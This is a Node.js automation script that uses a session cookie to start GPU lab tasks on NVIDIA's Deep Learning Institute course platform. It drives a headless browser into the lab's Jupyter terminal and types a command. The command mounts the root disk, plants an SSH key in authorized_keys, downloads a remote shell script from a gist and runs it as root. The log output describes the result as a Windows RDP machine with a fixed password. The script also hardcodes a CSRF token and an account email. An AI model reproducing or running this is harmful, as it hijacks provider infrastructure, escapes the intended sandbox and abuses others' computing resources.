const sessionId = process.argv[2];
const route = process.argv[3];

console.log(`✅ New index.js started with sessionId: ${sessionId}, route: ${route}`);

const puppeteer = require("puppeteer");
const { exec } = require("node:child_process");
const { promisify } = require("node:util");
const axios = require('axios');
const dns = require('dns');
const { URL } = require('url');
const fs = require('fs');
const path = require('path');



function blockForMilliseconds(ms) {
  const sharedBuf = new SharedArrayBuffer(4);
  const int32 = new Int32Array(sharedBuf);
  Atomics.wait(int32, 0, 0, ms);
}




function logToFile(...messages) {
  const logFile = path.join(__dirname, `${route}.txt`);
  const line = messages.join(' ') + '\n'; // Join like console.log
  fs.appendFileSync(logFile, line);
  console.log(...messages); // Also log to console
}


function deleteLogFile(route) {
  const logFile = path.join(__dirname, `${route}.txt`);

  if (fs.existsSync(logFile)) {
    fs.unlinkSync(logFile);
    console.log(`Deleted ${route}.txt`);
  } else {
    console.log(`${route}.txt does not exist`);
  }
}

// Catch uncaught exceptions (synchronous errors)
process.on('uncaughtException', (err) => {
  logToFile('❌ An error occurred!!!');
  blockForMilliseconds(5000);
  deleteLogFile(route);
  process.exit(1);  // Optional: Exit the process
});

// Catch unhandled promise rejections (async errors)
process.on('unhandledRejection', (reason, promise) => {
  logToFile('❌ An error occurred!!!');
  blockForMilliseconds(5000);
  deleteLogFile(route);
  process.exit(1);  // Optional: Exit the process
});


console.log("🟢 Session ID:", sessionId);

const url = 'https://learn.learn.nvidia.com/courses/course-v1:DLI+S-ES-01+V1/xblock/block-v1:DLI+S-ES-01+V1+type@nvidia-dli-platform-gpu-task-xblock+block@f373f5a2e27a42a78a61f699899d3904/handler/check_task';

const url1 = 'https://learn.learn.nvidia.com/courses/course-v1:DLI+S-ES-01+V1/xblock/block-v1:DLI+S-ES-01+V1+type@nvidia-dli-platform-gpu-task-xblock+block@f373f5a2e27a42a78a61f699899d3904/handler/start_task';

const url2 = 'https://learn.learn.nvidia.com/courses/course-v1:DLI+S-ES-01+V1/xblock/block-v1:DLI+S-ES-01+V1+type@nvidia-dli-platform-gpu-task-xblock+block@f373f5a2e27a42a78a61f699899d3904/handler/end_task';

const headers = {
  "accept": "application/json, text/javascript, */*; q=0.01",
  "accept-language": "en-US,en;q=0.9,vi;q=0.8",
  "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
  "x-requested-with": "XMLHttpRequest",
  "cookie": `openedx-language-preference=en; sessionid=${sessionId}; edxloggedin=true; edx-user-info={"version": 1, "username": "nsnsnsnsnvnhh", "email": "thuonghai2711+hhjbvbjbay@gmail.com"}`
};

const headers2 = {
  "accept": "application/json, text/javascript, */*; q=0.01",
  "accept-language": "en-US,en;q=0.9",
  "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
  "priority": "u=1, i",
  "sec-ch-ua": "\"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": "\"Windows\"",
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-origin",
  "x-csrftoken": "GhjaC6fK8Q5GDZQlYoCBDIw47D4ESq4TKgTlzo91oVD2jsD1DUvCxiMWb4yhmT2U",
  "x-requested-with": "XMLHttpRequest",
  "referer": "https://learn.learn.nvidia.com/xblock/block-v1:DLI+S-ES-01+V1+type@vertical+block@c9c23620d63c470a8077ab70b0bfa9c0?show_title=0&show_bookmark_button=1&recheck_access=1&view=student_view",
  "Referrer-Policy": "strict-origin-when-cross-origin",
  "cookie": `
    _uetsid=2c325db05c3b11f098cd6305b8eb2810;
    _uetvid=2c3297405c3b11f0a5ebc1705a765a1a;
    _clck=bp0bwi|2|fxf|0|2015;
    _clsk=1na57zn|1752006966599|1|1|y.clarity.ms/collect;
    edxloggedin=true;
    sessionid=${sessionId};
    csrftoken=GhjaC6fK8Q5GDZQlYoCBDIw47D4ESq4TKgTlzo91oVD2jsD1DUvCxiMWb4yhmT2U;
    openedx-language-preference=en;
    edx-user-info={"version": 1, "username": "nsnsnsnsnvnhh", "email": "thuonghai2711+hhjbvbjbay@gmail.com"}`.replace(/\s+/g, ' ') // gộp cookie một dòng
};


let jupyterURL = null;
let interval;
let retryCount = 0;
const maxRetries = 20; // stop after 5 minutes (60 * 5s)

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


function msToHoursMinutes(ms) {
  const totalMinutes = Math.floor(ms / 60000);
  const hours = Math.floor(totalMinutes / 60);
  const minutes = totalMinutes % 60;
  return `${hours}h ${minutes}m`;
}

async function fetchTaskUsage() {
  try {
    const response = await axios.post(url, "{}", { headers });
    const data = response.data;

    if (!data.task_course_usage_limit || !data.task_course_usage_remaining) {
      console.error("❌ Required fields missing in response.");
      return;
    }

    const limit = msToHoursMinutes(data.task_course_usage_limit);
    const remaining = msToHoursMinutes(data.task_course_usage_remaining);

    logToFile("⏱️ Limit:", limit);
    logToFile("⏳ Remaining:", remaining);
  } catch (error) {
    console.error("❌ Request failed:", error.message);
  }
}

async function simulatedHang(duration = 10000) {
  const start = Date.now();
  while (Date.now() - start < duration) {
    await Promise.resolve();
  }
}

async function postWithRetry(url, data, options) {
  for (let attempt = 1; attempt <= 2; attempt++) {
    try {
      const res = await axios.post(url, data, options);
      return res; // success
    } catch (error) {
      if (attempt === 2) {
        throw new Error(`Request failed after 2 attempts: ${error}`);
      }
      await new Promise(resolve => setTimeout(resolve, 1000)); // wait 1s
    }
  }
}




logToFile("🔄 Checking:", route);
(async () => {
  await postWithRetry(url2, "{}", { headers });
  await simulatedHang(10000); // Simulated 10-second hang
  logToFile('✅ Checked! Waitting to start!');
})();




function waitForJupyterURL() {
  return new Promise((resolve, reject) => {
    let running = false;

    async function checkTask() {
      if (running) return; // prevent overlapping executions
      running = true;

      try {
        retryCount++;
        await axios.post(url1, "{}", { headers });
        const response = await axios.post(url, "{}", { headers });
        const task_link = response.data?.task_link;

        if (!task_link) {
          console.log(`⏳ task_link not found (try #${retryCount}), retrying in 15s...`);

          if (retryCount >= maxRetries) {
            clearInterval(interval);
            logToFile('❌ An error occurred!!!');
            blockForMilliseconds(5000);
            deleteLogFile(route);
            return reject(new Error('❌ Max retries reached, stopping.'));
          }

          return; // wait for next retry
        }

        // ✅ Found task_link
        jupyterURL = task_link;
        console.log('✅ Jupyter URL found:', jupyterURL);
        clearInterval(interval);
        return resolve(jupyterURL);

      } catch (error) {
        console.error(`❌ Request failed (try #${retryCount}):`, error.message);

        if (retryCount >= maxRetries) {
          clearInterval(interval);
          logToFile('❌ An error occurred!!!');
          blockForMilliseconds(5000);
          deleteLogFile(route);
          return reject(new Error('❌ Max retries reached due to errors.'));
        }
      } finally {
        running = false;
      }
    }

    // Start immediately
    checkTask();

    // Continue polling every 15 seconds
    interval = setInterval(checkTask, 15000);
  });
}


(async () => {
  try {
    const urlFound = await waitForJupyterURL();
    console.log('Continue with this URL:', urlFound);
    logToFile('VM Instance init in process...');
    console.log('⏳ Sleeping for 6 minutes...');
    await sleep(6 * 60 * 1000); // 6 minutes = 360000 ms
    console.log('✅ Done URL!');
    logToFile('VM Instance created...');
    main();// Your next async code here, runs only after URL is found

  } catch (err) {
    console.error('Failed to get Jupyter URL:', err.message);
  }
})();

async function main() {
  const { stdout: chromiumPath } = await promisify(exec)("which chromium || which chromium-browser || which google-chrome");

 
  const browser = await puppeteer.launch({
    headless: true,
    args: ["--no-sandbox", "--disable-setuid-sandbox"],
    executablePath: chromiumPath.trim(),
  });

  const page = await browser.newPage();
  
  await page.goto(jupyterURL, { waitUntil: "networkidle2" });

  // Open launcher with Ctrl+Shift+L
  await page.keyboard.down("Control");
  await page.keyboard.down("Shift");
  await page.keyboard.press("KeyL");
  await page.keyboard.up("Shift");
  await page.keyboard.up("Control");
  console.log("🟢 Pressed Ctrl+Shift+L");

  // Click Terminal card
  await page.waitForSelector('.jp-LauncherCard[title="Start a new terminal session"]', { timeout: 10000 });
  await page.click('.jp-LauncherCard[title="Start a new terminal session"]');
  console.log("🟢 Clicked Terminal card");

  // Wait 10 seconds to let terminal open
  await sleep(10 * 1000);

  // Focus the page itself (not iframe)
  await page.bringToFront();

  // Type 'lscpu' on the page directly
  const command = 'mount /dev/root /tmp;cd /tmp;rm -rf dli;ip=$(curl -s ifconfig.me) && ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa  ; echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys && ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip \'wget https://gist.github.com/kmille36/f498dd6e96d18ba9743458c643682256/raw/341bf12ba62d217446a5004e39f38f44b8393e57/testdd.sh ; sudo bash testdd.sh; sudo reboot\'';

  await page.keyboard.type(command, { delay: 10 });
  

  // Press Enter
  await page.keyboard.press("Enter");
  console.log('🟢 Typed "comand" and pressed Enter');

  // Wait a bit to see output
  await sleep(5 * 1000);

  await browser.close();
  console.log("🟢 Browser closed");
  logToFile('VM Instance installing...');
  console.log('⏳ Sleeping for 8 minutes...');
  await sleep(8 * 60 * 1000); // 6 minutes = 360000 ms
  logToFile('✅ Done GPU!');
  const ipAddress = await convertToIPAddress(jupyterURL);
  logToFile('🕒', new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok' }) + ' (GMT+7)');
  logToFile("✅ IP address:", ipAddress);
  logToFile("✅ RDP/VNC: win11/T4@123456");
  logToFile("✅ VM run maximum 5H. Session expires in 300s");
  await fetchTaskUsage();
  await sleep(300 * 1000);
  deleteLogFile(route);
  console.log(`🛑 Child process done for sessionId: ${sessionId}`);
  process.exit(0);
}

async function convertToIPAddress(jupyterURL) {
  try {
    const parsed = new URL(jupyterURL);
    const { address } = await dns.promises.lookup(parsed.hostname);
    return address; // Just the IP
  } catch (error) {
    console.error("DNS lookup failed:", error.message);
    return null;
  }
}



